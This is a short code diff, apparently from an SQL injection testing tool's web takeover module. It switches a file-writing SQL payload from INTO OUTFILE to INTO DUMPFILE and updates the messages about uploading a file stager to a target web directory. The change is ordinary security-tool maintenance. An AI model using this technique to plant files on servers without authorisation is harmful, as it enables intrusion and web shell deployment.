@@ -139,7 +139,7 @@ class Web:
                 randInt = randomInt()
                 query += "OR %d=%d " % (randInt, randInt)
 
-        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", OUTFILE=outFile, HEXSTRING=hexencode(uplQuery))
+        query += getSQLSnippet(DBMS.MYSQL, "write_file_limit", DUMPFILE=outFile, HEXSTRING=hexencode(uplQuery))
         query = agent.prefixQuery(query)
         query = agent.suffixQuery(query)
         payload = agent.payload(newValue=query)
@@ -217,9 +217,9 @@ class Web:
             else:
                 directory = directory[2:] if isWindowsDriveLetterPath(directory) else directory
 
-            # Upload the file stager with the LIMIT 0, 1 INTO OUTFILE technique
+            # Upload the file stager with the LIMIT 0, 1 INTO DUMPFILE technique
             infoMsg = "trying to upload the file stager on '%s' " % directory
-            infoMsg += "via LIMIT INTO OUTFILE technique"
+            infoMsg += "via LIMIT INTO DUMPFILE technique"
             logger.info(infoMsg)
             self._webFileInject(stagerContent, stagerName, directory)
 
